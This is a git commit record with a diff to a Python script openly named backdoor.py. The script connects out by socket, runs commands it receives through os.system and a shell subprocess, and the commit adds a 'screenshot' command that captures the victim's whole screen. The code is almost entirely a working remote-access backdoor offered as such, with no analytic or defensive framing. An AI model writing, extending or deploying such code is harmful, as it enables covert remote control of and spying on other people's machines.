f8e9a8367204cf3abe5f8e316663846634d6d888
Grandhi Naga Srikanth <nagasrikanthgrandhi@gmail.com>
2018-06-05 06:37:44 -0400

    Update backdoor.py

--- backdoor.py
+++ backdoor.py
@@ -1,6 +1,11 @@
 import socket
 import os
 import subprocess
+#from gi.repository import gi.require_version('Gdk', '3.0')
+import gi
+gi.require_version('Gdk', '3.0')
+from gi.repository import Gdk
+
 ip="127.0.0.1"
 port=8080 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -13,6 +18,11 @@ while True:
         break
     elif com.startswith("execute="):
         os.system(com[8:])
+    elif com=="screenshot":
+        window = Gdk.get_default_root_window()
+        x, y, width, height = window.get_geometry()
+        pb = Gdk.pixbuf_get_from_window(window, x, y, width, height)
+        pb.savev("screenshot.png", "png", (), ())
     else:
         proc = subprocess.Popen(com[4:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
         op= proc.stdout.read()+proc.stderr.read()
